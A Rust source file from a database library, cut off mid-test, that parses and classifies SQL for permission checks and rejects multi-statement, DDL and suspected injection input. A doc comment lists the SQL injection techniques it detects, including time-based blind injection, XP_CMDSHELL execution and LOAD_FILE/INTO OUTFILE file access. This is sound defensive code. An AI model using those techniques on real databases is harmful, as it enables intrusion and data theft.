// Copyright (c) 2025-2026 Kirky.X🌠
// SPDX-License-Identifier: MIT
//! SQL Parser module using sqlparser for enhanced SQL parsing and validation.
//! This module provides robust SQL operation detection and permission action mapping.

use serde::{Deserialize, Serialize};
use sqlparser::ast::{
    Delete, FromTable, Query, Set, SetExpr, Statement, TableObject, TableWithJoins,
};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use std::sync::Arc;
use thiserror::Error;
use unicode_normalization::UnicodeNormalization;

/// SQL语句最大长度（10KB）
const MAX_SQL_LENGTH: usize = 10_000;

/// 表名最大长度（128字符）
const MAX_TABLE_NAME_LENGTH: usize = 128;

/// 查询最大嵌套深度（防止复杂度攻击）
const MAX_QUERY_DEPTH: usize = 10;

#[cfg(feature = "permission")]
pub use super::permission::PermissionAction;

#[cfg(all(feature = "permission-engine", not(feature = "permission")))]
pub use super::permission_engine::PermissionAction;

/// 权限操作类型（本地定义）
///
/// # 注意
///
/// 这是 sql-parser 模块的内部定义，仅当 `permission` 和 `permission-engine` 特性均未启用时使用。
///
/// 当 `permission` 特性启用时，应使用 `dbnexus::permission::PermissionAction` 或
/// `dbnexus::permission_engine::EnginePermissionAction`（包含额外的 `All` 变体）。
///
/// # 设计说明
///
/// 为了避免重复定义和维护成本，建议在代码中：
/// - 如果启用了 `permission` 特性，使用 `dbnexus::permission::PermissionAction`
/// - 如果启用了 `permission-engine` 特性，使用 `dbnexus::permission_engine::EnginePermissionAction`
/// - 仅在两者都未启用时使用此本地定义
#[cfg(not(any(feature = "permission", feature = "permission-engine")))]
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum PermissionAction {
    /// 查询操作
    Select,
    /// 插入操作
    Insert,
    /// 更新操作
    Update,
    /// 删除操作
    Delete,
}

/// 解析结果缓存后端：库内同步 LRU 端口（prepare_cache），sql-parser 由此
/// 不再隐含 cache→oxcache 依赖（oxcache 仅供 permission 等真正消费方携带）
use crate::database::pool::prepare_cache::PreparedStatementCache;

/// Errors that can occur during SQL parsing
#[derive(Debug, Error)]
pub enum SqlParseError {
    /// SQL parsing failed due to syntax errors or invalid structure
    #[error("Failed to parse SQL: {0}")]
    ParseError(String),

    /// SQL statement type is not supported for permission checking
    #[error("Unsupported SQL statement type: {0}")]
    UnsupportedStatement(String),

    /// Empty SQL statement was provided
    #[error("Empty SQL statement")]
    EmptyStatement,

    /// Multiple SQL statements detected (only single statements are allowed)
    #[error("Multiple statements not allowed")]
    MultipleStatements,

    /// SQL statement contains variables that could indicate dynamic SQL injection
    #[error("SQL statement contains variables: {0}")]
    ContainsVariables(String),
}

impl crate::i18n::error_ext::LocalizedMsg for SqlParseError {
    fn message_key(&self) -> &'static str {
        match self {
            Self::ParseError(_) => "sql-parse-error",
            Self::UnsupportedStatement(_) => "sql-unsupported-statement",
            Self::EmptyStatement => "sql-empty-statement",
            Self::MultipleStatements => "sql-multiple-statements",
            Self::ContainsVariables(_) => "sql-contains-variables",
        }
    }

    fn message_args(&self) -> Vec<(&str, String)> {
        match self {
            Self::ParseError(reason) => vec![("reason", reason.clone())],
            Self::UnsupportedStatement(stmt_type) => vec![("stmt_type", stmt_type.clone())],
            Self::EmptyStatement => vec![],
            Self::MultipleStatements => vec![],
            Self::ContainsVariables(details) => vec![("details", details.clone())],
        }
    }
}

/// Represents a parsed SQL operation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParsedSqlOperation {
    /// The type of SQL operation
    pub operation_type: SqlOperationType,
    /// The table name if applicable
    pub table_name: Option<String>,
    /// 所有涉及的表名（包括 JOIN 中的表），用于完整权限检查
    pub all_table_names: Vec<String>,
    /// The raw SQL statement
    pub sql: String,
}

/// Types of SQL operations that can be detected
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SqlOperationType {
    /// SELECT queries
    Select,
    /// INSERT queries
    Insert,
    /// UPDATE queries
    Update,
    /// DELETE queries
    Delete,
    /// Data Definition Language (CREATE, ALTER, DROP, TRUNCATE)
    Ddl,
    /// Data Control Language (GRANT, REVOKE)
    Dcl,
    /// Transaction control (START TRANSACTION, COMMIT, ROLLBACK)
    Transaction,
    /// Other/miscellaneous operations
    Other,
}

/// SQL Parser with dialect awareness and caching support
///
/// # 缓存优化
///
/// 此实现包含 LRU 缓存，用于缓存已解析的 SQL 操作。
/// 缓存可以显著提高重复 SQL 语句的解析性能。
///
/// # 示例
///
/// ```rust,ignore
/// # // 需要 sql-parser feature
/// use dbnexus::sql_parser::SqlParser;
///
/// let parser = SqlParser::new();
/// let result = parser.parse_operation("SELECT * FROM users");
/// // 第二次解析相同 SQL 会使用缓存
/// let cached = parser.parse_operation("SELECT * FROM users");
/// ```
pub struct SqlParser {
    dialect: GenericDialect,
    /// 解析结果缓存（库内同步 LRU，容量淘汰；命中/未命中统计由端口承载）
    parse_cache: PreparedStatementCache<ParsedSqlOperation>,
}

impl Default for SqlParser {
    fn default() -> Self {
        Self::build(DEFAULT_CACHE_SIZE)
    }
}

const DEFAULT_CACHE_SIZE: usize = 1000;

/// 全局共享 SqlParser 单例
///
/// 避免每次 SQL 执行都创建新 parser + 新缓存。首次调用时初始化，
/// 后续调用直接返回 Arc 引用，缓存跨所有 Session/Pool 共享。
static SHARED_PARSER: tokio::sync::OnceCell<Arc<SqlParser>> = tokio::sync::OnceCell::const_new();

impl SqlParser {
    /// 同步构建 parser（构造为纯内存操作，无 IO 与异步等待）
    fn build(cache_size: usize) -> Self {
        Self {
            dialect: GenericDialect {},
            parse_cache: PreparedStatementCache::new(cache_size.max(1)),
        }
    }

    /// Create a new SQL parser with generic dialect support and default cache
    #[inline]
    pub async fn new() -> Self {
        Self::build(DEFAULT_CACHE_SIZE)
    }

    /// 获取全局共享的 SqlParser 实例（推荐）
    ///
    /// 首次调用时初始化 parser + 缓存，后续调用直接返回 Arc 引用。
    /// 缓存跨所有 Session/DbPool 共享，避免重复创建开销。
    ///
    /// **性能对比**：
    /// - `SqlParser::new().await`：每次创建新缓存实例（内存分配）
    /// - `SqlParser::shared().await`：首次创建，后续 O(1) 返回 Arc clone
    #[inline]
    pub async fn shared() -> Arc<SqlParser> {
        SHARED_PARSER
            .get_or_init(|| async { Arc::new(Self::build(DEFAULT_CACHE_SIZE)) })
            .await
            .clone()
    }

    /// Create a parser with specific cache size
    ///
    /// 容量下限收敛到 1（非正容量按单条目缓存处理）
    #[inline]
    pub async fn with_cache_size(cache_size: usize) -> Self {
        Self::build(cache_size)
    }

    /// Create a parser with specific database dialect
    #[inline]
    pub async fn with_dialect(_db_type: &str) -> Self {
        // Using GenericDialect for broad compatibility
        Self::build(DEFAULT_CACHE_SIZE)
    }

    /// 清空解析缓存（条目与命中/未命中统计一并重置）
    #[inline]
    pub async fn clear_cache(&self) {
        self.parse_cache.clear();
    }

    /// 获取缓存命中率统计
    ///
    /// 返回 (命中次数, 未命中次数) 的元组
    #[inline]
    pub fn cache_stats(&self) -> (u64, u64) {
        let stats = self.parse_cache.stats();
        (stats.hits, stats.misses)
    }

    /// Parse and validate a single SQL statement
    ///
    /// # 缓存行为
    ///
    /// 解析结果会被缓存以提高重复查询的性能（失败解析不入缓存，仅成功
    /// 产物可复用）。
    /// 使用 `clear_cache()` 可手动清空缓存。
    ///
    /// # async 无挂起点
    ///
    /// async 签名仅为对齐调用管道（`Session` 执行链）的接口形态；方法体
    /// 为纯同步路径（同步 LRU 探测 + 同步 AST 解析，无 `.await`），调用
    /// 不会真正挂起任务，也不阻塞执行器线程。
    pub async fn parse_single(&self, sql: &str) -> Result<ParsedSqlOperation, SqlParseError> {
        let sql = sql.trim();

        // 探测缓存（命中/未命中统计由端口承载）
        if let Some(cached) = self.parse_cache.get(sql) {
            return Ok((*cached).clone());
        }

        // 执行解析（失败结果不入缓存，仅成功产物可复用）
        let result = self.parse_single_uncached(sql)?;

        // 存储结果到缓存
        self.parse_cache.insert(sql.to_string(), result.clone());

        Ok(result)
    }

    /// 内部方法：执行实际解析（不使用缓存）
    fn parse_single_uncached(&self, sql: &str) -> Result<ParsedSqlOperation, SqlParseError> {
        let sql = sql.trim();

        if sql.is_empty() {
            return Err(SqlParseError::EmptyStatement);
        }

        // 验证SQL长度限制
        if sql.len() > MAX_SQL_LENGTH {
            return Err(SqlParseError::ParseError(format!(
                "SQL statement exceeds maximum length of {} bytes",
                MAX_SQL_LENGTH
            )));
        }

        // Check for multiple statements (basic detection)
        if sql.contains(';') {
            // Allow only safe SET statements (SET SESSION, SET NAMES, etc.) — not arbitrary SET
            let is_safe_set = sql.starts_with("SET ");
            if !is_safe_set {
                // 检查查询深度（防止复杂度攻击）
                let depth = estimate_query_depth(sql);
                if depth > MAX_QUERY_DEPTH {
                    return Err(SqlParseError::ParseError(format!(
                        "Query depth {} exceeds maximum allowed depth of {}",
                        depth, MAX_QUERY_DEPTH
                    )));
                }
                return Err(SqlParseError::MultipleStatements);
            }
        }

        // Check for SQL injection patterns
        if contains_sql_injection(sql) {
            return Err(SqlParseError::ParseError(
                "SQL statement contains potential injection patterns".to_string(),
            ));
        }

        // Check for DDL operations
        if contains_ddl_operation(sql) {
            return Err(SqlParseError::UnsupportedStatement(
                "DDL operations are not allowed".to_string(),
            ));
        }

        // Check for variables that might indicate dynamic SQL
        if contains_variables(sql) {
            return Err(SqlParseError::ContainsVariables(
                "SQL contains potentially dangerous variables. Use parameterized queries instead."
                    .to_string(),
            ));
        }

        let statements = Parser::parse_sql(&self.dialect, sql)
            .map_err(|e| SqlParseError::ParseError(e.to_string()))?;

        if statements.len() != 1 {
            return Err(SqlParseError::MultipleStatements);
        }

        let statement = statements
            .into_iter()
            .next()
            .ok_or_else(|| SqlParseError::ParseError("No statement found".to_string()))?;
        self.classify_statement(statement, sql.to_string())
    }

    /// Parse SQL and extract operation type (simplified version for backward compatibility)
    ///
    /// # 返回值
    ///
    /// - `Some((table_name, action))` - 成功解析的 DML 操作
    /// - `None` - 不支持的语句类型（DDL/DCL/Transaction）或解析失败
    ///
    /// # 注意
    ///
    /// 此方法仅支持 DML 操作（SELECT, INSERT, UPDATE, DELETE）。
    /// 对于 DDL、DCL 和 Transaction 操作，返回 `None`。
    ///
    /// 建议使用 `parse_single()` 获取完整的解析结果，包括操作类型信息。
    ///
    /// # 缓存行为
    ///
    /// 此方法使用内部缓存来加速重复查询。
    ///
    /// # 警告
    ///
    /// 此同步方法使用 `block_on` 来执行异步解析。
    /// 在异步上下文中（如 `#[tokio::test]`）会导致运行时冲突。
    /// 请使用 `parse_operation_async()` 替代。
    pub fn parse_operation(&self, sql: &str) -> Option<(String, PermissionAction)> {
        // Check if we're already in an async context
        if tokio::runtime::Handle::try_current().is_ok() {
            // We're in an async context - this method should not be called
            // Return None and let callers use parse_operation_async instead
            return None;
        }
        // Safe to block_on in sync context
        tokio::runtime::Handle::current()
            .block_on(self.parse_single(sql))
            .ok()
            .and_then(|parsed| {
                // 仅支持 DML 操作，其他操作返回 None
                let action = match parsed.operation_type {
                    SqlOperationType::Select => Some(PermissionAction::Select),
                    SqlOperationType::Insert => Some(PermissionAction::Insert),
                    SqlOperationType::Update => Some(PermissionAction::Update),
                    SqlOperationType::Delete => Some(PermissionAction::Delete),
                    // DDL/DCL/Transaction/Other 操作不支持
                    SqlOperationType::Ddl
                    | SqlOperationType::Dcl
                    | SqlOperationType::Transaction
                    | SqlOperationType::Other => None,
                };

                // 只有当操作类型和表名都有效时才返回
                parsed.table_name.zip(action)
            })
    }

    /// Parse SQL and extract operation type (异步版本)
    ///
    /// # 返回值
    ///
    /// - `Ok(Some((table_name, action)))` - 成功解析的 DML 操作
    /// - `Ok(None)` - 不支持的语句类型（DDL/DCL/Transaction）
    /// - `Err` - 解析失败
    ///
    /// # 注意
    ///
    /// 此方法仅支持 DML 操作（SELECT, INSERT, UPDATE, DELETE）。
    /// 对于 DDL、DCL 和 Transaction 操作，返回 `Ok(None)`。
    ///
    /// # 缓存行为
    ///
    /// 此方法使用内部缓存来加速重复查询。
    pub async fn parse_operation_async(
        &self,
        sql: &str,
    ) -> Result<Option<(String, PermissionAction)>, SqlParseError> {
        let parsed = self.parse_single(sql).await?;

        // 仅支持 DML 操作，其他操作返回 None
        let action = match parsed.operation_type {
            SqlOperationType::Select => Some(PermissionAction::Select),
            SqlOperationType::Insert => Some(PermissionAction::Insert),
            SqlOperationType::Update => Some(PermissionAction::Update),
            SqlOperationType::Delete => Some(PermissionAction::Delete),
            // DDL/DCL/Transaction/Other 操作不支持
            SqlOperationType::Ddl
            | SqlOperationType::Dcl
            | SqlOperationType::Transaction
            | SqlOperationType::Other => None,
        };

        // 只有当操作类型和表名都有效时才返回
        Ok(parsed.table_name.zip(action))
    }

    /// Classify a parsed statement into an operation
    fn classify_statement(
        &self,
        statement: Statement,
        sql: String,
    ) -> Result<ParsedSqlOperation, SqlParseError> {
        let (operation_type, table_name, all_table_names) = match statement {
            Statement::Query(query) => {
                let (primary, all) = extract_table_from_query(&query);
                (SqlOperationType::Select, primary, all)
            }
            Statement::Insert(insert) => {
                let table_name = match &insert.table {
                    TableObject::TableName(name) => Some(name.to_string()),
                    _ => None,
                };
                let all = table_name.iter().cloned().collect();
                (SqlOperationType::Insert, table_name, all)
            }
            Statement::Update(update) => {
                let table_name = extract_table_name_from_table_with_joins(&update.table);
                let mut all = Vec::new();
                if let Some(ref name) = table_name {
                    all.push(name.clone());
                }
                // UPDATE 也可能包含 JOIN
                for join in &update.table.joins {
                    if let sqlparser::ast::TableFactor::Table { name, .. } = &join.relation {
                        all.push(name.to_string());
                    }
                }
                (SqlOperationType::Update, table_name, all)
            }
            Statement::Delete(delete) => {
                let table_name = extract_table_from_delete(&delete);
                let all = table_name.iter().cloned().collect();
                (SqlOperationType::Delete, table_name, all)
            }
            Statement::CreateTable(create_table) => {
                let name = create_table.name.to_string();
                (SqlOperationType::Ddl, Some(name.clone()), vec![name])
            }
            Statement::AlterTable(alter_table) => {
                let name = alter_table.name.to_string();
                (SqlOperationType::Ddl, Some(name.clone()), vec![name])
            }
            Statement::Drop {
                names, object_type, ..
            } => {
                let is_table = format!("{:?}", object_type).contains("Table");
                let table_name = if is_table && !names.is_empty() {
                    Some(names[0].to_string())
                } else {
                    None
                };
                let all: Vec<String> = if is_table {
                    names.iter().map(|n| n.to_string()).collect()
                } else {
                    Vec::new()
                };
                (SqlOperationType::Ddl, table_name, all)
            }
            Statement::Truncate(truncate) => {
                let table_name = truncate.table_names.first().map(|t| t.name.to_string());
                let all: Vec<String> = truncate
                    .table_names
                    .iter()
                    .map(|t| t.name.to_string())
                    .collect();
                (SqlOperationType::Ddl, table_name, all)
            }
            Statement::CreateIndex(create_index) => {
                let name = create_index.table_name.to_string();
                (SqlOperationType::Ddl, Some(name.clone()), vec![name])
            }
            Statement::Grant { .. } => (SqlOperationType::Dcl, None, Vec::new()),
            Statement::Revoke { .. } => (SqlOperationType::Dcl, None, Vec::new()),
            Statement::StartTransaction { .. }
            | Statement::Commit { .. }
            | Statement::Rollback { .. } => (SqlOperationType::Transaction, None, Vec::new()),
            Statement::Set(Set::SingleAssignment { variable, .. }) => {
                let var_name = variable.to_string().to_lowercase();
                if is_ddl_related_variable(&var_name) {
                    (SqlOperationType::Ddl, None, Vec::new())
                } else {
                    (SqlOperationType::Other, None, Vec::new())
                }
            }
            Statement::Set(_) => (SqlOperationType::Other, None, Vec::new()),
            _ => (SqlOperationType::Other, None, Vec::new()),
        };

        // 验证表名长度
        if let Some(ref table) = table_name
            && table.len() > MAX_TABLE_NAME_LENGTH
        {
            return Err(SqlParseError::ParseError(format!(
                "Table name exceeds maximum length of {} characters",
                MAX_TABLE_NAME_LENGTH
            )));
        }

        Ok(ParsedSqlOperation {
            operation_type,
            table_name,
            all_table_names,
            sql,
        })
    }
}

/// Check if SQL contains variables or dangerous patterns (enhanced detection)
///
/// `?` prepared-statement 占位符**不算**危险变量：它是参数绑定的安全形态，
/// 值通过 prepared statement 传递，数据库不会将其解析为 SQL 代码。
fn contains_variables(sql: &str) -> bool {
    // 委托统一注入检测引擎（变量正则已合并至 InjectionEngine；
    // `?` prepared-statement 占位符仍不算危险变量——参数绑定的安全形态，
    // 依赖参数化 API 的调用方（如 execute_duckdb_with_params）必须放行）
    crate::access::injection_engine::InjectionEngine::global().has_dynamic_variables(sql)
}

/// Check if SQL contains potential SQL injection patterns
///
/// # 检测模式分类
///
/// 1. **UNION 注入**: UNION SELECT, UNION ALL SELECT, UNION DISTINCT SELECT
/// 2. **布尔盲注**: OR 1=1, OR TRUE, OR FALSE, OR ''=', OR '%'='
/// 3. **时间盲注**:
///    - MySQL: SLEEP(), BENCHMARK()
///    - PostgreSQL: PG_SLEEP()
///    - SQL Server: WAITFOR DELAY
///    - Oracle: DBMS_PIPE.RECEIVE_MESSAGE()
/// 4. **动态 SQL 执行**: EXEC(), EXECUTE(), SP_EXECUTESQL, XP_CMDSHELL
/// 5. **文件操作**: LOAD_FILE(), INTO OUTFILE, INTO DUMPFILE
/// 6. **信息泄露**: INFORMATION_SCHEMA, SYSOBJECTS, SYSCOLUMNS
/// 7. **编码绕过**: CHAR(), CONCAT(), 0X (十六进制)
/// 8. **注释注入**: --, /* */
///
/// # Unicode 规范化
///
/// 在检测前会先对 SQL 进行 Unicode 规范化（NFKC），防止攻击者使用
/// 视觉相似但 Unicode 编码不同的字符绕过检测。
pub fn contains_sql_injection(sql: &str) -> bool {
    // 委托统一注入检测引擎（规则集合并 + 去重见 injection_engine 模块文档；
    // parity 测试保证与合并前遗留规则表判定一致）
    crate::access::injection_engine::InjectionEngine::global().is_suspicious_relational(sql)
}

/// Check if SQL contains DDL operations
fn contains_ddl_operation(sql: &str) -> bool {
    let sql_upper = sql.trim().to_uppercase();

    let ddl_keywords = [
        "CREATE TABLE",
        "CREATE INDEX",
        "DROP TABLE",
        "DROP INDEX",
        "ALTER TABLE",
        "TRUNCATE TABLE",
        "CREATE DATABASE",
        "DROP DATABASE",
    ];

    for keyword in &ddl_keywords {
        if sql_upper.contains(keyword) {
            return true;
        }
    }

    false
}

/// Remove string literals from SQL to avoid false positives in variable detection
///
/// 单引号和双引号内容被视为字符串字面量并替换为空格。
/// 反引号（MySQL 标识符引用）保留原始内容，因为它是标识符引用而非字符串字面量。
pub(crate) fn remove_string_literals(sql: &str) -> String {
    let mut result = String::new();
    let mut in_string = false;
    let mut string_char = ' ';
    let mut escape_next = false;

    for ch in sql.chars() {
        if escape_next {
            escape_next = false;
            if in_string {
                result.push(' '); // Replace escaped chars in strings with space
            } else {
                result.push(ch);
            }
            continue;
        }

        if ch == '\\' {
            escape_next = true;
            if in_string {
                result.push(' '); // Replace escape char in strings with space
            } else {
                result.push(ch);
            }
            continue;
        }

        if in_string {
            if ch == string_char {
                in_string = false;
            }
            result.push(' '); // Replace string content with space
            continue;
        }

        // 仅将单引号和双引号视为字符串字面量分隔符
        // 反引号是 MySQL 标识符引用（如 `table_name`），保留原始内容
        if ch == '\'' || ch == '"' {
            in_string = true;
            string_char = ch;
            result.push(' '); // Replace string delimiters with space
            continue;
        }

        result.push(ch);
    }

    result
}

/// 移除 SQL 中的块注释（`/* ... */`），用等长空格替换以保持位置信息
pub(crate) fn strip_block_comments(sql: &str) -> String {
    let mut result = String::with_capacity(sql.len());
    let mut chars = sql.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '/' && chars.peek() == Some(&'*') {
            chars.next(); // consume '*'
            result.push(' ');
            result.push(' ');
            // 消费直到 */ 或 EOF
            loop {
                match chars.next() {
                    Some('*') if chars.peek() == Some(&'/') => {
                        chars.next();
                        result.push(' ');
                        result.push(' ');
                        break;
                    }
                    Some(c) => {
                        result.push(if c == '\n' { '\n' } else { ' ' });
                    }
                    None => break,
                }
            }
        } else {
            result.push(ch);
        }
    }
    result
}

/// Unicode 规范化函数
///
/// 使用 NFKC（Normalization Form Compatibility Composition）规范化 Unicode 字符串。
/// 这可以防止攻击者使用视觉相似但编码不同的字符绕过安全检测。
///
/// # 示例
///
/// - 全角字符转为半角字符（如 `ＳＥＬＥＣＴ` -> `SELECT`）
/// - 兼容性分解（如 `ﬃ` -> `ffi`）
/// - 组合字符规范化
pub(crate) fn normalize_unicode(sql: &str) -> String {
    sql.nfkc().collect()
}

/// Extract table name from TableWithJoins
fn extract_table_name_from_table_with_joins(table_with_joins: &TableWithJoins) -> Option<String> {
    if let sqlparser::ast::TableFactor::Table { name, .. } = &table_with_joins.relation {
        return Some(name.to_string());
    }
    None
}

/// Extract table name from Delete statement
fn extract_table_from_delete(delete: &Delete) -> Option<String> {
    // Delete has tables: Vec<ObjectName> and from: FromTable
    if !delete.tables.is_empty() {
        return Some(delete.tables[0].to_string());
    }
    match &delete.from {
        FromTable::WithFromKeyword(tables) => {
            if !tables.is_empty() {
                extract_table_name_from_table_with_joins(&tables[0])
            } else {
                None
            }
        }
        FromTable::WithoutKeyword(tables) => {
            if !tables.is_empty() {
                extract_table_name_from_table_with_joins(&tables[0])
            } else {
                None
            }
        }
    }
}

fn extract_table_from_query(query: &Query) -> (Option<String>, Vec<String>) {
    let mut all_tables = Vec::new();
    extract_query_tables(query, &mut all_tables);
    let primary = all_tables.first().cloned();
    (primary, all_tables)
}

/// 递归提取 Query 中所有被引用的表（FROM/JOIN/派生表/WHERE/HAVING 子查询/集合操作）
///
/// 供权限检查使用：只检查主表会让受限角色通过 JOIN/子查询越权访问未授权表，
/// 因此必须收集语句涉及的**全部**表。
fn extract_query_tables(query: &Query, out: &mut Vec<String>) {
    extract_set_expr_tables(query.body.as_ref(), out);
}

/// 递归提取 SetExpr（查询主体）中引用的表
///
/// 处理 `SELECT` 主体、UNION/INTERSECT/EXCEPT 集合操作（左右递归）以及
/// 括号包裹的子查询（`SetExpr::Query`）；其余变体（VALUES 等）不涉及 FROM 表，跳过。
fn extract_set_expr_tables(set_expr: &SetExpr, out: &mut Vec<String>) {
    match set_expr {
        SetExpr::Select(select) => extract_select_tables(select, out),
        SetExpr::Query(query) => extract_query_tables(query, out),
        SetExpr::SetOperation { left, right, .. } => {
            extract_set_expr_tables(left, out);
            extract_set_expr_tables(right, out);
        }
        _ => {}
    }
}

/// 从单个 Select 语句提取全部表（FROM/JOIN/派生表/WHERE/HAVING 子查询）
fn extract_select_tables(select: &sqlparser::ast::Select, out: &mut Vec<String>) {
    for from_item in &select.from {
        // 主表 / JOIN 表（含派生表内层子查询）
        match &from_item.relation {
            sqlparser::ast::TableFactor::Table { name, .. } => out.push(name.to_string()),
            sqlparser::ast::TableFactor::Derived { subquery, .. } => {
                extract_query_tables(subquery, out);
            }
            _ => {}
        }
        for join in &from_item.joins {
            match &join.relation {
                sqlparser::ast::TableFactor::Table { name, .. } => out.push(name.to_string()),
                sqlparser::ast::TableFactor::Derived { subquery, .. } => {
                    extract_query_tables(subquery, out);
                }
                _ => {}
            }
        }
    }

    // WHERE / HAVING / PREWHERE / QUALIFY 中的子查询
    for expr in [
        &select.prewhere,
        &select.selection,
        &select.having,
        &select.qualify,
    ]
    .into_iter()
    .flatten()
    {
        extract_subquery_tables(expr, out);
    }
}

/// 递归遍历表达式，提取其中嵌套子查询引用的表
fn extract_subquery_tables(expr: &sqlparser::ast::Expr, out: &mut Vec<String>) {
    use sqlparser::ast::{Expr, FunctionArg, FunctionArgExpr};
    match expr {
        Expr::Subquery(q)
        | Expr::InSubquery { subquery: q, .. }
        | Expr::Exists { subquery: q, .. } => {
            extract_query_tables(q, out);
        }
        Expr::Nested(e) => extract_subquery_tables(e, out),
        Expr::UnaryOp { expr: e, .. } => extract_subquery_tables(e, out),
        Expr::BinaryOp { left, right, .. } => {
            extract_subquery_tables(left, out);
            extract_subquery_tables(right, out);
        }
        Expr::IsDistinctFrom(a, b) | Expr::IsNotDistinctFrom(a, b) => {
            extract_subquery_tables(a, out);
            extract_subquery_tables(b, out);
        }
        Expr::Between {
            expr: e, low, high, ..
        } => {
            extract_subquery_tables(e, out);
            extract_subquery_tables(low, out);
            extract_subquery_tables(high, out);
        }
        Expr::InList { expr: e, list, .. } => {
            extract_subquery_tables(e, out);
            for item in list {
                extract_subquery_tables(item, out);
            }
        }
        Expr::InUnnest {
            expr: e,
            array_expr,
            ..
        } => {
            extract_subquery_tables(e, out);
            extract_subquery_tables(array_expr, out);
        }
        Expr::AnyOp { left, right, .. } | Expr::AllOp { left, right, .. } => {
            extract_subquery_tables(left, out);
            extract_subquery_tables(right, out);
        }
        Expr::Like {
            expr: e, pattern, ..
        }
        | Expr::ILike {
            expr: e, pattern, ..
        } => {
            extract_subquery_tables(e, out);
            extract_subquery_tables(pattern, out);
        }
        Expr::SimilarTo {
            expr: e, pattern, ..
        } => {
            extract_subquery_tables(e, out);
            extract_subquery_tables(pattern, out);
        }
        Expr::IsNull(e)
        | Expr::IsNotNull(e)
        | Expr::IsTrue(e)
        | Expr::IsNotTrue(e)
        | Expr::IsFalse(e)
        | Expr::IsNotFalse(e)
        | Expr::IsUnknown(e)
        | Expr::IsNotUnknown(e) => extract_subquery_tables(e, out),
        Expr::Cast { expr: e, .. } => extract_subquery_tables(e, out),
        Expr::Function(f) => {
            use sqlparser::ast::FunctionArguments;
            match &f.args {
                FunctionArguments::Subquery(q) => extract_query_tables(q, out),
                FunctionArguments::List(list) => {
                    for arg in &list.args {
                        match arg {
                            FunctionArg::Unnamed(arg_expr)
                            | FunctionArg::Named { arg: arg_expr, .. }
                            | FunctionArg::ExprNamed { arg: arg_expr, .. } => {
                                if let FunctionArgExpr::Expr(e) = arg_expr {
                                    extract_subquery_tables(e, out);
                                }
                            }
                        }
                    }
                }
                FunctionArguments::None => {}
            }
        }
        Expr::Case {
            operand,
            conditions,
            else_result,
            ..
        } => {
            if let Some(o) = operand {
                extract_subquery_tables(o, out);
            }
            for when in conditions {
                extract_subquery_tables(&when.condition, out);
                extract_subquery_tables(&when.result, out);
            }
            if let Some(e) = else_result {
                extract_subquery_tables(e, out);
            }
        }
        Expr::JsonAccess { value: root, .. } => extract_subquery_tables(root, out),
        Expr::IsNormalized { expr: e, .. } => extract_subquery_tables(e, out),
        // 其余表达式类型不包含子查询
        _ => {}
    }
}

/// Check if a variable is DDL-related
fn is_ddl_related_variable(var_name: &str) -> bool {
    let ddl_vars = [
        "foreign_keys",
        "auto_increment_increment",
        "sql_mode",
        "character_set",
        "collation",
    ];
    ddl_vars.iter().any(|v| var_name.contains(v))
}

/// Check if a statement is a DDL operation (uses simple keyword detection, not full parsing)
pub fn is_ddl_operation(sql: &str) -> bool {
    let sql_upper = sql.trim().to_uppercase();

    // Check for DDL keywords directly without full parsing
    let ddl_keywords = [
        "CREATE TABLE",
        "DROP TABLE",
        "ALTER TABLE",
        "TRUNCATE TABLE",
        "CREATE INDEX",
        "DROP INDEX",
        "CREATE VIEW",
        "DROP VIEW",
    ];

    for keyword in &ddl_keywords {
        if sql_upper.contains(keyword) {
            return true;
        }
    }

    false
}

/// 估算查询深度（简化版，通过嵌套括号）
///
/// 先剥离字符串字面量，避免字符串内的括号被错误计入深度。
/// 例如 `WHERE note = '(select ...)'` 中的括号不应增加深度。
fn estimate_query_depth(sql: &str) -> usize {
    // 先移除字符串字面量，防止字符串内的括号干扰深度计算
    let cleaned = remove_string_literals(sql);
    let mut depth: usize = 1;
    let mut max_depth: usize = 1;

    for char in cleaned.chars() {
        match char {
            '(' => {
                depth += 1;
                max_depth = max_depth.max(depth);
            }
            ')' => {
                depth = depth.saturating_sub(1);
            }
            _ => {}
        }
    }

    max_depth
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_parse_select() {
        let parser = SqlParser::new().await;
        let result = parser
            .parse_single("SELECT * FROM users WHERE id = 1")
            .await;
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Select);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[tokio::test]
    async fn test_parse_insert() {
        let parser = SqlParser::new().await;
        let result = parser
            .parse_single("INSERT INTO users (name) VALUES ('test')")
            .await;
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Insert);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[tokio::test]
    async fn test_parse_update() {
        let parser = SqlParser::new().await;
        let result = parser
            .parse_single("UPDATE users SET name = 'test' WHERE id = 1")
            .await;
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Update);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[tokio::test]
    async fn test_parse_delete() {
        let parser = SqlParser::new().await;
        let result = parser.parse_single("DELETE FROM users WHERE id = 1").await;
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Delete);
        assert_eq!(parsed.table_name, Some("users".to_string()));
    }

    #[tokio::test]
    async fn test_parse_grant() {
        let parser = SqlParser::new().await;
        // GenericDialect 可能不支持完整的 GRANT 语法，使用简化版本
        let result = parser
            .parse_single("GRANT ALL PRIVILEGES ON users TO user1")
            .await;
        assert!(result.is_ok());
        let parsed = result.unwrap();
        assert_eq!(parsed.operation_type, SqlOperationType::Dcl);
    }

    #[tokio::test]
    async fn test_multiple_statements_rejected() {
        let parser = SqlParser::new().await;
        let result = parser
            .parse_single("SELECT * FROM users; SELECT * FROM posts")
            .await;
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            SqlParseError::MultipleStatements
        ));
    }

    #[tokio::test]
    async fn test_empty_statement_rejected() {
        let parser = SqlParser::new().await;
        let result = parser.parse_single("").await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), SqlParseError::EmptyStatement));
    }

    #[tokio::test]
    async fn test_variables_detected() {
        let parser = SqlParser::new().await;
        let result = parser
